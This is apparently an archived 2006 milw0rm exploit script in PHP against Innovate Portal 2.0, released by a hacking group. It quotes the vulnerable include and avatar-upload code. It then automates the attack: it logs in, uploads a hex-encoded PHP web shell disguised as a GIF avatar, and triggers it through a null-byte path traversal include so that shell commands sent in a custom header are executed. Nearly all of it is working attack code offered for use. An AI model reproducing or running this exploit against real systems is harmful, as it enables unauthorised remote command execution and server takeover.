<?
print '
:::::::::  :::::::::: :::     ::: ::::::::::: :::        
:+:    :+: :+:        :+:     :+:     :+:     :+:        
+:+    +:+ +:+        +:+     +:+     +:+     +:+        
+#+    +:+ +#++:++#   +#+     +:+     +#+     +#+        
+#+    +#+ +#+         +#+   +#+      +#+     +#+        
#+#    #+# #+#          #+#+#+#       #+#     #+#        
#########  ##########     ###     ########### ########## 
::::::::::: ::::::::::     :::     ::::    ::::  
    :+:     :+:          :+: :+:   +:+:+: :+:+:+ 
    +:+     +:+         +:+   +:+  +:+ +:+:+ +:+ 
    +#+     +#++:++#   +#++:++#++: +#+  +:+  +#+ 
    +#+     +#+        +#+     +#+ +#+       +#+ 
    #+#     #+#        #+#     #+# #+#       #+# 
    ###     ########## ###     ### ###       ### 
	
   - - [DEVIL TEAM THE BEST POLISH TEAM] - -
 
Innovate Portal  <= 2.0 Remote Code Execution Exploit

[Script name: Innovate Portal v2.0
[Script site: http://www.innovate-board.de/

Find by: Kacper (a.k.a Rahim)


========>  DEVIL TEAM IRC: 72.20.18.6:6667 #devilteam  <========



Contact: kacper1964@yahoo.pl

or

http://www.rahim.webd.pl/


(c)od3d by Kacper
-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
Greetings DragonHeart and all DEVIL TEAM Patriots :)
- Leito & Leon 
TomZen, Gelo, Ramzes, DMX, Ci2u, Larry, @steriod, Drzewko, CrazzyIwan, Rammstein
Adam., Kicaj., DeathSpeed, Arkadius, Michas, pepi, nukedclx, SkD, MXZ, sysios, 
mIvus, nukedclx, SkD, wacky, 
-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-

                Greetings for 4ll Fusi0n Group mambers ;-)

-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
';


/*
in file acp.php:
line 41-45:
....
if(isset($_REQUEST['content'])) {
	if(!file_exists('./admincp/'.$_REQUEST['content'].'.php')) {
		error('error','cant_administrate');
	}
	include('./admincp/'.$_REQUEST['content'].'.php');           // <------- {1}
....
in file content/usercp.php:
line 93-123:
....
if($_REQUEST['action'] == 'avatar') {
	if(!empty($_REQUEST['do']) && $_REQUEST['do'] == 'update') {
		if(isset($_REQUEST['use_avatar']) && $_REQUEST['use_avatar'] == 0) {
                        if(file_exists('./images/avatars/'.$user['avatar'])) {
				@unlink('./images/avatars/'.$user['avatar']);
			}
			$db->unbuffered_query("UPDATE ip".$n."_usersettings SET avatar='' WHERE setting_userid='".$user['userid']."'");
		}
		if(isset($_FILES['avatar']) && is_array($_FILES['avatar'])) {
			if(file_exists('./images/avatars/'.$user['avatar'])) {
				@unlink('./images/avatars/'.$user['avatar']);
			}
			$avatartype = get_file_extension($_FILES['avatar']['name']);
			if(move_uploaded_file($_FILES['avatar']['tmp_name'],'./images/avatars/'.$user['userid'].'.'.addslashes($avatartype))) {                 // <------- !!!{2}
				$imagesizes = getimagesize('./images/avatars/'.$user['userid'].'.'.addslashes($avatartype));
				$filesize = filesize('./images/avatars/'.$user['userid'].'.'.addslashes($avatartype));
				if($imagesizes[0] > $config['upload_avatar_width'] || $imagesizes[1] > $config['upload_avatar_height'] || $filesize > $config['upload_avatar_size']) {
					@unlink('./images/avatars/'.$user['userid'].'.'.addslashes($avatartype));
					$db->unbuffered_query("UPDATE ip".$n."_usersettings SET avatar='' WHERE setting_userid='".$user['userid']."'");
					error('error','upload_istobig');
				}
				$db->unbuffered_query("UPDATE ip".$n."_usersettings SET avatar='".$user['userid'].'.'.addslashes($avatartype)."' WHERE setting_userid='".$user['userid']."'");
			}
		$centercontent .= msgbox(get_lang('usercp','update_succ') , 'index.php?content=usercp&amp;action=avatar&amp;sid='.$sid);
		}
	}
	else {
		eval('$cvalue = "'.$tpl->get('content_usercp_avatar').'";');
		$centercontent .= newtable(get_lang('usercp','header_styles'),$cvalue);
	}
}
....
*/



if ($argc<7) {
print_r('
-----------------------------------------------------------------------------
Usage: php '.$argv[0].' host path username password user_id cmd OPTIONS
host:      target server (ip/hostname)
path:      Innovate_Portal path
username:  Hauru
password:  devilteam
user_id:   You user ID (id=)
cmd:       a shell command (ls -la)
Options:
 -p[port]:    specify a port other than 80
 -P[ip:port]: specify a proxy
Example:
php '.$argv[0].' 2.2.2.2 /Innovate_Portal/ ls -la -P1.1.1.1:80
php '.$argv[0].' 1.1.1.1 /  -p81
-----------------------------------------------------------------------------
');
die;
}

error_reporting(0);
ini_set("max_execution_time",0);
ini_set("default_socket_timeout",5);

function quick_dump($string)
{
  $result='';$exa='';$cont=0;
  for ($i=0; $i<=strlen($string)-1; $i++)
  {
   if ((ord($string[$i]) <= 32 ) | (ord($string[$i]) > 126 ))
   {$result.="  .";}
   else
   {$result.="  ".$string[$i];}
   if (strlen(dechex(ord($string[$i])))==2)
   {$exa.=" ".dechex(ord($string[$i]));}
   else
   {$exa.=" 0".dechex(ord($string[$i]));}
   $cont++;if ($cont==15) {$cont=0; $result.="\r\n"; $exa.="\r\n";}
  }
 return $exa."\r\n".$result;
}
$proxy_regex = '(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}\b)';
function sendpacketii($packet)
{
  global $proxy, $host, $port, $html, $proxy_regex;
  if ($proxy=='') {
    $ock=fsockopen(gethostbyname($host),$port);
    if (!$ock) {
      echo 'No response from '.$host.':'.$port; die;
    }
  }
  else {
	$c = preg_match($proxy_regex,$proxy);
    if (!$c) {
      echo 'Not a valid proxy...';die;
    }
    $parts=explode(':',$proxy);
    echo "Connecting to ".$parts[0].":".$parts[1]." proxy...\r\n";
    $ock=fsockopen($parts[0],$parts[1]);
    if (!$ock) {
      echo 'No response from proxy...';die;
	}
  }
  fputs($ock,$packet);
  if ($proxy=='') {
    $html='';
    while (!feof($ock)) {
      $html.=fgets($ock);
    }
  }
  else {
    $html='';
    while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html))) {
      $html.=fread($ock,1);
    }
  }
  fclose($ock);
}
function make_seed()
{
   list($usec, $sec) = explode(' ', microtime());
   return (float) $sec + ((float) $usec * 100000);
}

$host=$argv[1];
$path=$argv[2];
$username=$argv[3];
$password=$argv[4];
$user_id=$argv[5];
$cmd="";

$port=80;
$proxy="";
for ($i=6; $i<$argc; $i++){
$temp=$argv[$i][0].$argv[$i][1];
if (($temp<>"-p") and ($temp<>"-P")) {$cmd.=" ".$argv[$i];}
if ($temp=="-p")
{
  $port=str_replace("-p","",$argv[$i]);
}
if ($temp=="-P")
{
  $proxy=str_replace("-P","",$argv[$i]);
}
}
if ($proxy=='') {$p=$path;} else {$p='http://'.$host.':'.$port.$path;}
echo "please wait...\n";

$data.='-----------------------------7d6224c08dc
Content-Disposition: form-data; name="username"

'.$username.'
-----------------------------7d6224c08dc
Content-Disposition: form-data; name="password"

'.$password.'
-----------------------------7d6224c08dc
Content-Disposition: form-data; name="submit"

Login
-----------------------------7d6224c08dc--
';


echo "login...\n";
$packet ="POST ".$p."login.php?page_id=3 HTTP/1.0\r\n";
$packet.="Content-Type: multipart/form-data; boundary=---------------------------7d6224c08dc\r\n";
$packet.="Content-Length: ".strlen($data)."\r\n";
$packet.="Host: ".$host."\r\n";
$packet.="Connection: Close\r\n\r\n";
$packet.=$data;
sendpacketii($packet);
sleep(1);

$hauru=
"\x20\x0d\x0a\x47\x49\x46\x38\x36\x0d\x0a\x3c\x3f\x70\x68\x70\x20".
"\x6f\x62\x5f\x63\x6c\x65\x61\x6e\x28\x29\x3b\x0d\x0a\x2f\x2f\x52".
"\x75\x63\x68\x6f\x6d\x79\x20\x7a\x61\x6d\x65\x6b\x20\x48\x61\x75".
"\x72\x75\x20\x3b\x2d\x29\x0d\x0a\x65\x63\x68\x6f\x22\x2e\x2e\x2e".
"\x48\x61\x63\x6b\x65\x72\x2e\x2e\x4b\x61\x63\x70\x65\x72\x2e\x2e".
"\x4d\x61\x64\x65\x2e\x2e\x69\x6e\x2e\x2e\x50\x6f\x6c\x61\x6e\x64".
"\x21\x21\x2e\x2e\x2e\x44\x45\x56\x49\x4c\x2e\x54\x45\x41\x4d\x2e".
"\x2e\x74\x68\x65\x2e\x2e\x62\x65\x73\x74\x2e\x2e\x70\x6f\x6c\x69".
"\x73\x68\x2e\x2e\x74\x65\x61\x6d\x2e\x2e\x47\x72\x65\x65\x74\x7a".
"\x2e\x2e\x2e\x22\x3b\x0d\x0a\x20\x0d\x0a\x20\x0d\x0a\x65\x63\x68".
"\x6f\x22\x2e\x2e\x2e\x47\x6f\x20\x54\x6f\x20\x44\x45\x56\x49\x4c".
"\x20\x54\x45\x41\x4d\x20\x49\x52\x43\x3a\x20\x37\x32\x2e\x32\x30".
"\x2e\x31\x38\x2e\x36\x3a\x36\x36\x36\x37\x20\x23\x64\x65\x76\x69".
"\x6c\x74\x65\x61\x6d\x22\x3b\x0d\x0a\x20\x0d\x0a\x20\x0d\x0a\x65".
"\x63\x68\x6f\x22\x2e\x2e\x2e\x44\x45\x56\x49\x4c\x20\x54\x45\x41".
"\x4d\x20\x53\x49\x54\x45\x3a\x20\x68\x74\x74\x70\x3a\x2f\x2f\x77".
"\x77\x77\x2e\x72\x61\x68\x69\x6d\x2e\x77\x65\x62\x64\x2e\x70\x6c".
"\x2f\x22\x3b\x0d\x0a\x20\x0d\x0a\x20\x0d\x0a\x69\x6e\x69\x5f\x73".
"\x65\x74\x28\x22\x6d\x61\x78\x5f\x65\x78\x65\x63\x75\x74\x69\x6f".
"\x6e\x5f\x74\x69\x6d\x65\x22\x2c\x30\x29\x3b\x0d\x0a\x20\x0d\x0a".
"\x20\x0d\x0a\x65\x63\x68\x6f\x20\x22\x48\x61\x75\x72\x75\x22\x3b".
"\x0d\x0a\x20\x0d\x0a\x20\x0d\x0a\x70\x61\x73\x73\x74\x68\x72\x75".
"\x28\x24\x5f\x53\x45\x52\x56\x45\x52\x5b\x48\x54\x54\x50\x5f\x48".
"\x41\x55\x52\x55\x5d\x29\x3b\x0d\x0a\x20\x0d\x0a\x20\x0d\x0a\x64".
"\x69\x65\x3b\x3f\x3e\x0d\x0a\x20";


$data.='-----------------------------7d6224c08dc
Content-Disposition: form-data; name="use_avatar"

1
-----------------------------7d6224c08dc
Content-Disposition: form-data; name="avatar"; filename="hauru.gif"
Content-Type: text/plain

'.$hauru.'
-----------------------------7d6224c08dc
Content-Disposition: form-data; name="submit"

Einstellungen Speichern
-----------------------------7d6224c08dc--
';

echo "upload hauru...\n";
$packet ="POST ".$p."index.php?content=usercp&action=avatar HTTP/1.0\r\n";
$packet.="Content-Type: multipart/form-data; boundary=---------------------------7d6224c08dc\r\n";
$packet.="Content-Length: ".strlen($data)."\r\n";
$packet.="Host: ".$host."\r\n";
$packet.="Connection: Close\r\n\r\n";
$packet.=$data;
sendpacketii($packet);
sleep(1);

echo "Hauru uploaded!! now remote code execution...\n";
$packet ="GET ".$p."acp.php?content=../images/avatars/".$user_id.".gif%00 HTTP/1.1\r\n";
$packet.="HAURU: ".$cmd."\r\n";
$packet.="Host: ".$host."\r\n";
$packet.="Connection: Close\r\n\r\n";
sendpacketii($packet);
if (strstr($html,"Hauru"))
{
$temp=explode("Hauru",$html);
die($temp[1]);
}
echo "Exploit err0r :(";
echo "Go to DEVIL TEAM IRC: 72.20.18.6:6667 #devilteam";
?>

# milw0rm.com [2006-11-01]
